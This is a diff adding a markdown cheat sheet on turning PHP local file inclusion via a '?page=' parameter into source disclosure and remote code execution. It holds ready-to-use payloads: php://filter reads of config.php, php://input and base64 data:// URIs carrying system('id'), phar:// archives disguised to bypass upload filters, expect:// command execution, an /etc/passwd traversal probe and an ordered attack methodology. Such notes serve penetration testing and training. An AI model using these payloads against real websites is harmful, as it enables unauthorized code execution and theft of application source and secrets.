@@ -1,0 +1,73 @@
+# php-page-injection
+
+**Author:** Julien Bongars\
+**Date:** 2026-02-12 14:11:10
+**Path:**
+
+---
+
+`?page=` passed to `include()` / `require()` / `file_get_contents()`: stream wrappers to read source or get RCE.
+
+## php://filter
+
+Read file source without executing it. Essential for extracting PHP source through LFI.
+
+```txt
+?page=php://filter/convert.base64-encode/resource=config.php
+```
+
+Then base64 decode the output. Without the filter, `include()` would execute the file — with it, you get raw source.
+
+## php://input
+
+Reads raw POST body as a file. Turns LFI into RCE.
+
+```http
+GET ?page=php://input
+POST body: <?php system('id'); ?>
+```
+
+Requires `allow_url_include = On`.
+
+## data://
+
+Inline a payload directly in the URL. Turns LFI into RCE without needing file upload or POST.
+
+```txt
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+```
+
+The base64 decodes to `<?php system('id'); ?>`. Also requires `allow_url_include = On`.
+
+## phar://
+
+Treats a PHAR archive as a filesystem. Useful when you can upload a file but can't get it executed directly.
+
+```txt
+?page=phar://uploads/evil.phar/shell
+```
+
+The PHAR can be disguised with a fake file header (e.g. GIF89a) to bypass upload filters.
+
+## expect://
+
+Directly executes OS commands. Rarely enabled (requires `expect` extension).
+
+```txt
+?page=expect://id
+```
+
+## Methodology
+
+1. Test for LFI: `?page=../../../etc/passwd`
+2. Read source with `php://filter` to understand the app
+3. Check `phpinfo()` for `allow_url_include` and `disable_functions`
+4. If `allow_url_include = On`: try `php://input` or `data://`
+5. If you can upload files: try `phar://`
+6. Last resort: `expect://` (usually not available)
+
+## Resources
+
+- [PHP wrappers](https://www.php.net/manual/en/wrappers.php) — `php://`, `data://`, `phar://`, `expect://`
+- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) — wrapper payloads
+- [HackTricks — file inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — wrapper RCE paths
